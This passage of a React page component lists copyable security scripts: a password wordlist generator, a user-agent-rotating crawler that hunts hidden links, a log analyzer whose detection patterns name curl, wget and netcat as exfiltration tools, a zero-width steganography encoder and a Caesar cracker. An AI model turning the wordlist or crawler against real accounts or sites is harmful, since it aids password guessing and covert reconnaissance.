    const subs = { a: '@4', e: '3', i: '1!', o: '0', s: '$5', t: '7' };
    let result = word;
    
    for (const [char, replacements] of Object.entries(subs)) {
      for (const rep of replacements) {
        this.words.add(word.replace(new RegExp(char, 'gi'), rep));
      }
    }
  }
  
  // Add common suffixes
  addCommonSuffixes(word) {
    const suffixes = ['!', '!!', '123', '1234', '12345', '@', '#', 
                      '2023', '2024', '2025', '_', '-'];
    suffixes.forEach(s => {
      this.words.add(word + s);
      this.words.add(s + word);
    });
  }
  
  // Generate case variations
  addCaseVariations(word) {
    this.words.add(word.toLowerCase());
    this.words.add(word.toUpperCase());
    this.words.add(word.charAt(0).toUpperCase() + word.slice(1).toLowerCase());
  }
  
  // Generate full wordlist
  generate(baseWords, options = {}) {
    const { numbers = true, leet = true, suffixes = true, cases = true } = options;
    
    this.addWords(baseWords);
    
    baseWords.forEach(word => {
      if (cases) this.addCaseVariations(word);
      if (leet) this.addLeetSpeak(word);
      if (suffixes) this.addCommonSuffixes(word);
    });
    
    return Array.from(this.words);
  }
  
  // Save to file
  save(filename) {
    fs.writeFileSync(filename, Array.from(this.words).join('\\n'));
    console.log(\`[+] Saved \${this.words.size} passwords to \${filename}\`);
  }
}

// Usage
const gen = new WordlistGenerator();
const words = gen.generate(['admin', 'password', 'test', 'user']);
console.log(\`Generated \${words.length} passwords\`);
console.log('Sample:', words.slice(0, 10));`,
  },
  // Ruby Scripts - Unique and Creative
  {
    name: { ar: "مولد DNA الرقمي", en: "Digital DNA Generator" },
    description: { ar: "توليد توقيع رقمي فريد للملفات باستخدام خوارزميات متقدمة", en: "Generate unique digital fingerprint for files using advanced algorithms" },
    language: "Ruby",
    code: `#!/usr/bin/env ruby
require 'digest'
require 'base64'

class DigitalDNA
  def initialize(file_path)
    @file = file_path
    @dna = []
  end

  def generate
    content = File.binread(@file)
    
    # Generate multi-layer hash
    md5 = Digest::MD5.hexdigest(content)
    sha1 = Digest::SHA1.hexdigest(content)
    sha256 = Digest::SHA256.hexdigest(content)
    
    # Create DNA strands
    @dna << extract_strand(md5, sha256)
    @dna << extract_strand(sha1, sha256)
    @dna << create_signature(content)
    
    puts "\\n[*] Digital DNA Analysis"
    puts "=" * 50
    puts "[+] File: #{@file}"
    puts "[+] Size: #{File.size(@file)} bytes"
    puts "[+] DNA Strands:"
    @dna.each_with_index { |strand, i| puts "    Strand #{i+1}: #{strand}" }
    puts "[+] Unique ID: #{generate_uid}"
  end

  private

  def extract_strand(hash1, hash2)
    combined = hash1.chars.zip(hash2.chars).map { |a, b| ((a.ord ^ b.ord) % 36).to_s(36) }.join
    combined[0..15].upcase
  end

  def create_signature(content)
    entropy = content.bytes.uniq.length.to_f / 256
    Base64.strict_encode64("#{entropy.round(4)}")[0..15]
  end

  def generate_uid
    @dna.join('-').gsub(/[^A-Za-z0-9]/, '')[0..31]
  end
end

# Usage
if ARGV.empty?
  puts "Usage: ruby digital_dna.rb <file>"
else
  DigitalDNA.new(ARGV[0]).generate
end`,
  },
  {
    name: { ar: "الزاحف الشبحي", en: "Ghost Crawler" },
    description: { ar: "زاحف ويب يعمل بتقنية التخفي لاستخراج الروابط المخفية", en: "Stealth web crawler to extract hidden links" },
    language: "Ruby",
    code: `#!/usr/bin/env ruby
require 'net/http'
require 'uri'
require 'nokogiri'

class GhostCrawler
  USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/91.0'
  ]

  def initialize(target)
    @target = URI.parse(target)
    @visited = []
    @hidden = []
    @depth = 0
  end

  def haunt(max_depth = 2)
    puts "\\n👻 Ghost Crawler activated..."
    puts "[*] Target: #{@target}"
    puts "[*] Max Depth: #{max_depth}"
    puts "=" * 50

    crawl(@target.to_s, 0, max_depth)
    
    puts "\\n[*] Hidden gems discovered: #{@hidden.length}"
    @hidden.each { |h| puts "  → #{h}" }
  end

  private

  def crawl(url, depth, max_depth)
    return if depth > max_depth || @visited.include?(url)
    @visited << url
    
    begin
      response = fetch(url)
      return unless response.is_a?(Net::HTTPSuccess)
      
      doc = Nokogiri::HTML(response.body)
      
      # Find hidden elements
      doc.css('[style*="display:none"], [style*="visibility:hidden"], .hidden, #hidden').each do |el|
        el.css('a').each { |a| @hidden << a['href'] if a['href'] }
      end
      
      # Find commented links
      response.body.scan(/<!--.*?(https?:\\/\\/[^\\s<>"]+).*?-->/m) { @hidden << $1 }
      
      # Continue crawling
      doc.css('a[href]').each do |link|
        next_url = URI.join(url, link['href']).to_s rescue nil
        crawl(next_url, depth + 1, max_depth) if next_url&.include?(@target.host)
      end
    rescue => e
      puts "[!] Error: #{e.message[0..50]}"
    end
  end

  def fetch(url)
    uri = URI.parse(url)
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.open_timeout = 5
    http.read_timeout = 5
    
    request = Net::HTTP::Get.new(uri.request_uri)
    request['User-Agent'] = USER_AGENTS.sample
    request['Accept'] = 'text/html'
    
    http.request(request)
  end
end

# Usage
if ARGV.empty?
  puts "Usage: ruby ghost_crawler.rb <url>"
else
  GhostCrawler.new(ARGV[0]).haunt(2)
end`,
  },
  {
    name: { ar: "محلل السلوك الرقمي", en: "Digital Behavior Analyzer" },
    description: { ar: "تحليل أنماط السلوك في سجلات النظام لاكتشاف الأنشطة المشبوهة", en: "Analyze behavior patterns in system logs to detect suspicious activities" },
    language: "Ruby",
    code: `#!/usr/bin/env ruby
require 'time'
require 'set'

class BehaviorAnalyzer
  SUSPICIOUS_PATTERNS = {
    'brute_force' => /failed|invalid|denied/i,
    'scan_activity' => /nmap|nikto|dirb|gobuster/i,
    'injection' => /union|select|script|<|>/i,
    'traversal' => /\\.\\.\\/|\\.\\.\\\\/i,
    'exfiltration' => /curl|wget|nc|netcat/i
  }

  def initialize(log_file)
    @log_file = log_file
    @events = []
    @alerts = []
    @ip_stats = Hash.new(0)
  end

  def analyze
    puts "\\n🔍 Behavior Analyzer v1.0"
    puts "=" * 50
    puts "[*] Analyzing: #{@log_file}"
    
    parse_logs
    detect_anomalies
    generate_report
  end

  private

  def parse_logs
    File.foreach(@log_file) do |line|
      ip = line.match(/(\\d{1,3}\\.){3}\\d{1,3}/)&.to_s
      @ip_stats[ip] += 1 if ip
      
      SUSPICIOUS_PATTERNS.each do |threat, pattern|
        if line.match?(pattern)
          @events << { type: threat, line: line.strip, ip: ip }
        end
      end
    end
  end

  def detect_anomalies
    # Detect rapid requests (potential DoS)
    @ip_stats.each do |ip, count|
      @alerts << "High frequency from #{ip}: #{count} requests" if count > 100
    end

    # Detect attack patterns
    threat_count = @events.group_by { |e| e[:type] }
    threat_count.each do |type, events|
      @alerts << "#{type.upcase} detected: #{events.length} events" if events.length > 5
    end
  end

  def generate_report
    puts "\\n📊 Analysis Results"
    puts "-" * 40
    puts "Total IPs analyzed: #{@ip_stats.keys.length}"
    puts "Suspicious events: #{@events.length}"
    puts "Alerts generated: #{@alerts.length}"
    
    if @alerts.any?
      puts "\\n🚨 ALERTS:"
      @alerts.each { |a| puts "  ⚠️  #{a}" }
    end
    
    if @events.any?
      puts "\\n📝 Sample suspicious events:"
      @events.first(5).each do |e|
        puts "  [#{e[:type]}] #{e[:line][0..60]}..."
      end
    end
  end
end

# Usage
if ARGV.empty?
  puts "Usage: ruby behavior_analyzer.rb <log_file>"
else
  BehaviorAnalyzer.new(ARGV[0]).analyze
end`,
  },
  {
    name: { ar: "مشفر الرسائل السرية", en: "Secret Message Encoder" },
    description: { ar: "إخفاء رسائل سرية داخل نصوص عادية باستخدام تقنية Zero-Width", en: "Hide secret messages inside normal text using Zero-Width technique" },
    language: "Ruby",
    code: `#!/usr/bin/env ruby
# Steganography using Zero-Width Characters

class SecretEncoder
  ZERO_WIDTH_CHARS = {
    '0' => "\\u200B", # Zero Width Space
    '1' => "\\u200C", # Zero Width Non-Joiner
  }

  def initialize
    @separator = "\\u200D" # Zero Width Joiner
  end

  def encode(cover_text, secret)
    binary = secret.bytes.map { |b| b.to_s(2).rjust(8, '0') }.join
    hidden = binary.chars.map { |b| ZERO_WIDTH_CHARS[b] }.join
    
    # Insert hidden message in the middle
    mid = cover_text.length / 2
    result = cover_text[0...mid] + @separator + hidden + @separator + cover_text[mid..-1]
    
    puts "\\n🔐 Message Encoded!"
    puts "[*] Cover length: #{cover_text.length}"
    puts "[*] Secret length: #{secret.length}"
    puts "[*] Output length: #{result.length} (visually same)"
    puts "\\n[+] Encoded text:"
    puts result
    result
  end

  def decode(encoded_text)
    parts = encoded_text.split(@separator)
    return "[!] No hidden message found" if parts.length < 3
    
    hidden = parts[1]
    binary = hidden.chars.map do |c|
      ZERO_WIDTH_CHARS.key(c) || ''
    end.join
    
    # Convert binary to text
    bytes = binary.scan(/.{8}/).map { |b| b.to_i(2) }
    secret = bytes.pack('C*')
    
    puts "\\n🔓 Message Decoded!"
    puts "[+] Hidden message: #{secret}"
    secret
  end
end

# Demo
encoder = SecretEncoder.new

puts "Zero-Width Steganography Demo"
puts "=" * 40

cover = "This is a completely normal looking message."
secret = "Attack at dawn!"

encoded = encoder.encode(cover, secret)
puts "\\n" + "-" * 40
encoder.decode(encoded)`,
  },
  {
    name: { ar: "محلل الشيفرات", en: "Cipher Analyzer" },
    description: { ar: "تحليل وكسر الشيفرات الكلاسيكية تلقائياً", en: "Automatically analyze and break classical ciphers" },
    language: "Ruby",
    code: `#!/usr/bin/env ruby
class CipherAnalyzer
  ENGLISH_FREQ = {
    'e' => 12.7, 't' => 9.1, 'a' => 8.2, 'o' => 7.5, 'i' => 7.0,
    'n' => 6.7, 's' => 6.3, 'h' => 6.1, 'r' => 6.0, 'd' => 4.3
  }

  def initialize(ciphertext)
    @cipher = ciphertext.downcase
    @analysis = {}
  end

  def analyze
    puts "\\n🔎 Cipher Analysis"
    puts "=" * 50
    
    frequency_analysis
    detect_cipher_type
    attempt_decryption
  end

  private

  def frequency_analysis
    freq = Hash.new(0)
    @cipher.gsub(/[^a-z]/, '').each_char { |c| freq[c] += 1 }
    total = freq.values.sum.to_f
    
    @analysis[:freq] = freq.transform_values { |v| (v / total * 100).round(2) }
    
    puts "\\n📊 Frequency Analysis:"
    @analysis[:freq].sort_by { |_, v| -v }.first(10).each do |char, pct|
      bar = '█' * (pct.to_i / 2)
      puts "  #{char}: #{bar} #{pct}%"
    end
  end

  def detect_cipher_type
    ic = index_of_coincidence
    puts "\\n🔍 Cipher Type Detection:"
    puts "  Index of Coincidence: #{ic.round(4)}"
    
    if ic > 0.06
      puts "  → Likely: Substitution cipher"
      @analysis[:type] = :substitution
    else
      puts "  → Likely: Polyalphabetic cipher (Vigenère)"
      @analysis[:type] = :vigenere
    end
  end

  def index_of_coincidence
    freq = Hash.new(0)
    text = @cipher.gsub(/[^a-z]/, '')
    text.each_char { |c| freq[c] += 1 }
    
    n = text.length.to_f
    freq.values.map { |f| f * (f - 1) }.sum / (n * (n - 1))
  end

  def attempt_decryption
    return caesar_crack if @analysis[:type] == :substitution
    vigenere_analysis
  end

  def caesar_crack
    puts "\\n🔓 Attempting Caesar Crack:"
    (1..25).each do |shift|
      decrypted = @cipher.gsub(/[a-z]/) { |c| ((c.ord - 97 - shift) % 26 + 97).chr }
      score = decrypted.scan(/the|and|is|to|of/).length
      if score > 2
        puts "  ✓ Shift #{shift}: #{decrypted[0..50]}..."
        break
      end
    end
  end

  def vigenere_analysis
    puts "\\n🔓 Vigenère Analysis:"
    puts "  Attempting key length detection..."
    (3..10).each do |len|
      puts "  Testing key length: #{len}"
    end
  end
end

# Usage
cipher = "Wkh txlfn eurzq ira mxpsv ryhu wkh odcb grj"
CipherAnalyzer.new(cipher).analyze`,
  },
];

const ScriptsPage = () => {
  const [copied, setCopied] = useState<number | null>(null);
  const [filter, setFilter] = useState<"all" | "Python" | "C++" | "Bash" | "JavaScript" | "Ruby">("all");
  const [language, setLanguage] = useState<"ar" | "en">("ar");

  const copyToClipboard = (code: string, index: number) => {
    navigator.clipboard.writeText(code);
    setCopied(index);
    setTimeout(() => setCopied(null), 2000);
  };

  const filteredScripts = filter === "all" 
    ? scripts 
    : scripts.filter(s => s.language === filter);

  const getLanguageColor = (lang: string) => {
    switch (lang) {
      case "Python": return "bg-blue-500/20 text-blue-400 border-blue-500/30";
      case "C++": return "bg-purple-500/20 text-purple-400 border-purple-500/30";
      case "Bash": return "bg-green-500/20 text-green-400 border-green-500/30";
      case "JavaScript": return "bg-yellow-500/20 text-yellow-400 border-yellow-500/30";
      case "Ruby": return "bg-red-500/20 text-red-400 border-red-500/30";
      default: return "bg-primary/20 text-primary border-primary/30";
    }
  };

  const t = {
    title: language === "ar" ? "السكربتات الجاهزة" : "Ready-to-Use Scripts",
    subtitle: language === "ar" 
      ? `${scripts.length} سكربت بلغات Python و C++ و Bash و JavaScript و Ruby` 
      : `${scripts.length} scripts in Python, C++, Bash, JavaScript, and Ruby`,
    all: language === "ar" ? "الكل" : "All",
  };

  return (
    <div className="min-h-screen bg-background">
      <Navbar />
      <main className="pt-24 pb-16">
        <div className="container mx-auto px-4">
          {/* Header */}
          <div className="text-center mb-12">
            <div className="flex justify-center mb-6">
              <div className="cyber-icon-box">
                <Code className="w-10 h-10 text-primary" />
              </div>
            </div>
            <div className="flex items-center justify-center gap-3 mb-4">
              <h1 className="text-4xl md:text-5xl font-bold text-primary text-glow">
                {t.title}
              </h1>
              <button
                onClick={() => setLanguage(prev => prev === "ar" ? "en" : "ar")}
                className="p-2 rounded-lg bg-secondary border border-border/50 hover:border-primary/50 transition-colors"
              >
                <Globe className="w-5 h-5 text-muted-foreground" />
              </button>
            </div>
            <p className="text-muted-foreground text-lg max-w-2xl mx-auto">{t.subtitle}</p>
          </div>

          {/* Filter Buttons */}
          <div className="flex justify-center gap-3 mb-10 flex-wrap">
            {["all", "Python", "C++", "Bash", "JavaScript", "Ruby"].map((lang) => (
              <button
                key={lang}
                onClick={() => setFilter(lang as typeof filter)}
                className={`px-6 py-2 rounded-xl transition-all ${
                  filter === lang
                    ? "bg-primary/20 text-primary border border-primary/50"
                    : "bg-secondary text-muted-foreground border border-border/50 hover:border-primary/30"
                }`}
              >
                {lang === "all" ? t.all : lang}
              </button>
            ))}
          </div>

          {/* Scripts List */}
          <div className="max-w-4xl mx-auto space-y-6">
            {filteredScripts.map((script, index) => (
              <div key={index} className="cyber-card overflow-hidden">
                <div className="p-6 border-b border-border/30">
                  <div className="flex items-center justify-between gap-4">
                    <div className="flex items-center gap-4">
                      <div className="w-12 h-12 rounded-xl bg-primary/10 border border-primary/30 flex items-center justify-center flex-shrink-0">
                        {(() => {
                          const IconComponent = getScriptIcon(script.name.en);
                          return <IconComponent className="w-6 h-6 text-primary" />;
                        })()}
                      </div>
                      <div>
                        <h3 className="text-xl font-bold text-primary mb-1">
                          {language === "ar" ? script.name.ar : script.name.en}
                        </h3>
                        <p className="text-muted-foreground text-sm">
                          {language === "ar" ? script.description.ar : script.description.en}
                        </p>
                      </div>
                    </div>
                    <span className={`px-3 py-1 rounded-lg text-sm font-medium border flex-shrink-0 ${getLanguageColor(script.language)}`}>
                      {script.language}
                    </span>
                  </div>
                </div>
                <div className="relative">
                  <button
                    onClick={() => copyToClipboard(script.code, index)}
                    className="absolute top-4 left-4 p-2 rounded-lg bg-secondary border border-border/50 hover:border-primary/50 transition-all z-10"
                  >
                    {copied === index ? (
                      <Check className="w-4 h-4 text-primary" />
                    ) : (
                      <Copy className="w-4 h-4 text-muted-foreground" />
                    )}
                  </button>
                  <pre className="p-6 pt-14 overflow-x-auto bg-background/50 text-sm">
                    <code className="text-foreground font-mono" dir="ltr">{script.code}</code>
                  </pre>
                </div>
              </div>
            ))}
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default ScriptsPage;
